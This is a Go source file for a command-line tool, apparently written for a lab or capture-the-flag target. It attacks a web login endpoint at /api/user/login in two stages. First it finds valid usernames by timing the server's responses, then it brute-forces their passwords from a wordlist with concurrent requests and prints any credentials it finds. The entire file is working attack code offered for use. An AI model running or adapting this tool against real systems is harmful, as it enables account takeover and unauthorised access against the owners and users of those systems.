package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

var ANSI_CLRLN string = "\r\x1b[2K\r"
var ANSI_CLRSC string = "\x1b[2J\x1b[H"
var ANSI_RST string = "\x1b[0m"
var ANSI_RED string = "\x1b[31;1m"
var ANSI_GRN string = "\x1b[32;1m"
var ANSI_YLW string = "\x1b[33;1m"
var ANSI_BLU string = "\x1b[34;1m"

type LoginRequestData struct {
	Username string `json:"username"`
	Password string `json:"password"`
}

type LoginResponse struct {
	Status string `json:"status"`
}

type UserCredentials struct {
	Username string
	Password string
}

var USERNAMES_DISCOVERED []string = []string{}
var CREDENTIALS_DISCOVERED []UserCredentials = []UserCredentials{}

func WordlistGenerator(wordlist string, c chan string) (success bool, message string) {
	defer close(c)

	fptr, err := os.Open(wordlist)
	if err != nil {
		return false, err.Error()
	}
	defer fptr.Close()

	filescanner := bufio.NewScanner(fptr)
	filescanner.Split(bufio.ScanLines)

	for filescanner.Scan() {
		c <- filescanner.Text()
	}

	return true, "worlist looped through successfully"
}

func TestCreds(targetURL string, passwordlist string) {
	var datachan chan string = make(chan string)
	var exitflag bool
	var wg *sync.WaitGroup = new(sync.WaitGroup)

	for _, username := range USERNAMES_DISCOVERED {
		go WordlistGenerator(passwordlist, datachan)
		for i := 0; i < 5; i++ {
			wg.Add(1)
			go TestPassword(targetURL, username, datachan, wg, &exitflag)
		}
		wg.Wait()
	}
	return
}

func TestPassword(targetURL string, username string, c chan string, wg *sync.WaitGroup, exitflag *bool) {
	defer wg.Done()
	var logindata LoginRequestData = LoginRequestData{Username: username}
	var responsedata LoginResponse = LoginResponse{}

	for password := range c {
		if *exitflag {
			fmt.Printf(ANSI_CLRLN)
			return
		}
		logindata.Password = password
		jsondata, err := json.Marshal(logindata)
		if err != nil {
			ErrMsg(err.Error())
		}

		SysMsgNB(fmt.Sprintf("Testing \"%s:%s\"", logindata.Username, logindata.Password))
		client := http.Client{Timeout: 30 * time.Second}
		req, err := http.NewRequest("POST", targetURL, bytes.NewReader(jsondata))
		if err != nil {
			ErrMsg(err.Error())
		} else {
			req.Header.Set("content-type", "application/json")
			resp, err := client.Do(req)
			if err != nil {
				ErrMsg(err.Error())
			} else {
				returnbytes, err := ioutil.ReadAll(resp.Body)
				if err != nil {
					resp.Body.Close()
					continue
				}
				json.Unmarshal(returnbytes, &responsedata)
				if strings.ToLower(responsedata.Status) != "invalid username or password" {
					SucMsg(fmt.Sprintf("Credentials Discovered: \"%s:%s\"", username, password))
					*exitflag = true
					resp.Body.Close()
					return
				}
				resp.Body.Close()
			}
		}
	}
	fmt.Printf(ANSI_CLRLN)
	return
}

func TestUsername(targetURL string, c chan string, wg *sync.WaitGroup) {
	defer wg.Done()
	var logindata LoginRequestData = LoginRequestData{Password: "invalidpassword!"}

	for username := range c {
		logindata.Username = username
		timenow := time.Now()
		jsondata, err := json.Marshal(logindata)
		if err != nil {
			ErrMsg(err.Error())
		}

		SysMsgNB(fmt.Sprintf("Testing \"%s\"", logindata.Username))
		client := http.Client{Timeout: 2 * time.Second}
		req, err := http.NewRequest("POST", targetURL, bytes.NewReader(jsondata))
		if err != nil {
			ErrMsg(err.Error())
		} else {
			req.Header.Set("content-type", "application/json")
			resp, err := client.Do(req)
			if err != nil {
				ErrMsg(err.Error())
			} else {
				resp.Body.Close()
				timediff := time.Now().Sub(timenow)
				if timediff > time.Second {
					SucMsg(fmt.Sprintf("Username Found: \"%s\"", logindata.Username))
					USERNAMES_DISCOVERED = append(USERNAMES_DISCOVERED, username)
				}
			}
		}
	}
	return
}

func FindUsername(baseURL string, wordlist string, threadcount int) (success bool, message string) {
	var namechan chan string = make(chan string)
	var wg *sync.WaitGroup = new(sync.WaitGroup)
	var targetURL string = fmt.Sprintf("%s/api/user/login", baseURL)

	go WordlistGenerator(wordlist, namechan)

	//============================================================
	// Spawn threadcount threads to brute force the username
	//============================================================
	for i := 0; i < threadcount; i++ {
		wg.Add(1)
		go TestUsername(targetURL, namechan, wg)
	}
	wg.Wait()

	fmt.Printf(ANSI_CLRLN)

	if len(USERNAMES_DISCOVERED) > 0 {
		message = fmt.Sprintf("%d usernames discovered", len(USERNAMES_DISCOVERED))
		success = true
	} else {
		message = "no usernames found"
		success = false
	}

	return success, message
}

func ValidatePort(portno int) (valid bool, message string) {
	if (portno < 1) || (portno > 65535) {
		return false, "port must be within range 1 - 65535"
	}

	return true, "port valid"
}

func ValidateThreadCount(threadcount int) (valid bool, message string) {
	if (threadcount < 1) || (threadcount > 50) {
		return false, "thread count must be in range 1 - 50"
	}

	return true, "thread count valid"
}

func SucMsg(msg string) {
	fmt.Printf("%s[%s+%s] %s\n", ANSI_CLRLN, ANSI_GRN, ANSI_RST, msg)
	return
}

func ErrMsg(msg string) {
	fmt.Printf("%s[%s-%s] %s\n", ANSI_CLRLN, ANSI_RED, ANSI_RST, msg)
	return
}

func InfMsg(msg string) {
	fmt.Printf("%s[%si%s] %s\n", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	return
}

func InfMsgNB(msg string) {
	fmt.Printf("%s[%si%s] %s", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	return
}

func SysMsg(msg string) {
	fmt.Printf("%s[%s*%s] %s\n", ANSI_CLRLN, ANSI_YLW, ANSI_RST, msg)
	return
}

func SysMsgNB(msg string) {
	fmt.Printf("%s[%s*%s] %s", ANSI_CLRLN, ANSI_YLW, ANSI_RST, msg)
	return
}

func main() {
	var baseURL string

	var brutelogin bool

	var message string

	var success bool

	var targetIP string
	var targetPort int
	var threadCount int

	var wordlistp string
	var wordlistu string

	flag.StringVar(&targetIP, "i", "127.0.0.1", "target IP address")
	flag.BoolVar(&brutelogin, "l", false, "attempt to brute-force login (username + password)")
	flag.IntVar(&targetPort, "p", 80, "target port")
	flag.IntVar(&threadCount, "t", 10, "number of threads used to brute force")
	flag.StringVar(&wordlistp, "P", "passwords.txt", "wordlist to use in password brute force")
	flag.StringVar(&wordlistu, "U", "names_short.txt", "wordlist to use in username brute force")
	flag.Parse()

	valid, message := ValidatePort(targetPort)
	if !valid {
		ErrMsg(message)
		os.Exit(1)
	}

	valid, message = ValidateThreadCount(threadCount)
	if !valid {
		ErrMsg(message)
		os.Exit(1)
	}

	InfMsg(fmt.Sprintf("Target IP: %s", targetIP))
	InfMsg(fmt.Sprintf("Target Port: %d", targetPort))
	InfMsg(fmt.Sprintf("Thread Count: %d", threadCount))
	InfMsg(fmt.Sprintf("Username Wordlist: %s", wordlistu))
	InfMsg(fmt.Sprintf("Password Wordlist: %s", wordlistp))
	fmt.Printf("\n")

	baseURL = fmt.Sprintf("http://%s:%d", targetIP, targetPort)

	success, message = FindUsername(baseURL, wordlistu, threadCount)
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	if brutelogin {
		TestCreds(fmt.Sprintf("%s/api/user/login", baseURL), wordlistp)
	}
	return
}

